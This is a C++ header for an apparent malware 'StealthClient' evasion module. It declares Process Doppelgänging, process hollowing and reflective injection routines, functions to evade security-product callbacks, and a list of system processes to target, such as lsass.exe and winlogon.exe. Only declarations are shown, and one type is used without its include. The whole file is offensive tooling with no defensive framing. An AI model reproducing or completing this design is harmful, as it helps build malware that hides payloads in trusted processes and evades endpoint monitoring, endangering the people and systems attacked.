#pragma once
#include <windows.h>
#include <string>
#include <vector>

namespace StealthClient {
namespace Evasion {

// Process Doppelgänging using Transacted File Operations (TxF)
class ProcessDoppelganging {
private:
    HANDLE m_transactionHandle;
    std::string m_targetPath;
    std::vector<uint8_t> m_payload;
    
    // TxF operations
    bool CreateTransaction();
    bool CreateTransactedFile(const std::string& path, const std::vector<uint8_t>& data);
    bool CommitTransaction();
    bool RollbackTransaction();
    bool CloseTransaction();
    
    // Process creation
    bool CreateProcessFromTransactedFile(const std::string& path);
    bool CreateProcessWithHollowing(const std::string& targetPath, const std::vector<uint8_t>& payload);
    
    // Process hollowing
    bool HollowProcess(HANDLE hProcess, const std::vector<uint8_t>& payload);
    bool UnmapOriginalImage(HANDLE hProcess, void* imageBase);
    bool AllocateNewImage(HANDLE hProcess, void* preferredBase, size_t imageSize);
    bool WriteNewImage(HANDLE hProcess, void* newBase, const std::vector<uint8_t>& payload);
    bool SetNewEntryPoint(HANDLE hProcess, void* newBase, void* entryPoint);
    bool ResumeProcess(HANDLE hProcess);
    
    // Helper functions
    bool IsValidPE(const std::vector<uint8_t>& data);
    void* GetImageBase(const std::vector<uint8_t>& data);
    size_t GetImageSize(const std::vector<uint8_t>& data);
    void* GetEntryPoint(const std::vector<uint8_t>& data);
    std::vector<IMAGE_SECTION_HEADER> GetSections(const std::vector<uint8_t>& data);
    
public:
    ProcessDoppelganging();
    ~ProcessDoppelganging();
    
    // Main doppelgänging functions
    bool CreateDoppelganger(const std::string& targetPath, const std::vector<uint8_t>& payload);
    bool InjectDoppelganger(DWORD targetProcessId, const std::vector<uint8_t>& payload);
    bool ExecuteDoppelganger(const std::string& targetPath, const std::vector<uint8_t>& payload);
    
    // Advanced techniques
    bool CreateDoppelgangerWithHollowing(const std::string& targetPath, const std::vector<uint8_t>& payload);
    bool CreateDoppelgangerWithInjection(DWORD targetProcessId, const std::vector<uint8_t>& payload);
    bool CreateDoppelgangerWithReflection(const std::vector<uint8_t>& payload);
    
    // Evasion techniques
    bool EvadeProcessCreationCallbacks();
    bool EvadeImageLoadCallbacks();
    bool EvadeThreadCreationCallbacks();
    bool EvadeMemoryAccessCallbacks();
    
    // Cleanup
    bool CleanupDoppelganger();
    bool RemoveTransactedFiles();
    
    // Status
    bool IsDoppelgangerActive() const;
    std::string GetDoppelgangerPath() const;
    DWORD GetDoppelgangerProcessId() const;
    
private:
    DWORD m_doppelgangerProcessId;
    bool m_doppelgangerActive;
    std::string m_doppelgangerPath;
};

// Advanced Process Doppelgänging with multiple techniques
class AdvancedProcessDoppelganging {
private:
    std::vector<ProcessDoppelganging> m_doppelgangers;
    std::mt19937 m_rng;
    
    // Multiple doppelgänger creation
    bool CreateMultipleDoppelgangers(const std::vector<std::string>& targetPaths, 
                                   const std::vector<std::vector<uint8_t>>& payloads);
    bool CreateDoppelgangerChain(const std::string& targetPath, 
                                const std::vector<std::vector<uint8_t>>& payloads);
    
    // Stealth techniques
    bool CreateStealthDoppelganger(const std::string& targetPath, 
                                 const std::vector<uint8_t>& payload);
    bool CreateInvisibleDoppelganger(const std::string& targetPath, 
                                   const std::vector<uint8_t>& payload);
    bool CreateGhostDoppelganger(const std::string& targetPath, 
                               const std::vector<uint8_t>& payload);
    
public:
    AdvancedProcessDoppelganging();
    ~AdvancedProcessDoppelganging();
    
    // Advanced creation methods
    bool CreateAdvancedDoppelganger(const std::string& targetPath, 
                                  const std::vector<uint8_t>& payload,
                                  int technique = 0);
    
    // Multiple target execution
    bool ExecuteOnMultipleTargets(const std::vector<std::string>& targetPaths, 
                                const std::vector<uint8_t>& payload);
    
    // Cleanup all doppelgängers
    bool CleanupAllDoppelgangers();
    
    // Get status
    size_t GetActiveDoppelgangerCount() const;
    std::vector<DWORD> GetDoppelgangerProcessIds() const;
};

// Global instances
extern ProcessDoppelganging g_ProcessDoppelganging;
extern AdvancedProcessDoppelganging g_AdvancedProcessDoppelganging;

// Convenience functions
bool CreateDoppelganger(const std::string& targetPath, const std::vector<uint8_t>& payload);
bool InjectDoppelganger(DWORD targetProcessId, const std::vector<uint8_t>& payload);
bool ExecuteDoppelganger(const std::string& targetPath, const std::vector<uint8_t>& payload);
bool CleanupDoppelganger();

// Process Doppelgänging techniques
namespace DoppelgangingTechniques {
    constexpr int TXF_BASIC = 0;
    constexpr int TXF_HOLLOWING = 1;
    constexpr int TXF_INJECTION = 2;
    constexpr int TXF_REFLECTION = 3;
    constexpr int TXF_STEALTH = 4;
    constexpr int TXF_INVISIBLE = 5;
    constexpr int TXF_GHOST = 6;
    constexpr int TXF_CHAIN = 7;
    constexpr int TXF_MULTIPLE = 8;
}

// Target process types
namespace TargetProcesses {
    const std::string EXPLORER = "explorer.exe";
    const std::string SVCHOST = "svchost.exe";
    const std::string WINLOGON = "winlogon.exe";
    const std::string SERVICES = "services.exe";
    const std::string LSASS = "lsass.exe";
    const std::string CSRSS = "csrss.exe";
    const std::string WININIT = "wininit.exe";
    const std::string SMSS = "smss.exe";
    const std::string SYSTEM = "System";
    const std::string IDLE = "Idle";
}

} // namespace Evasion
} // namespace StealthClient
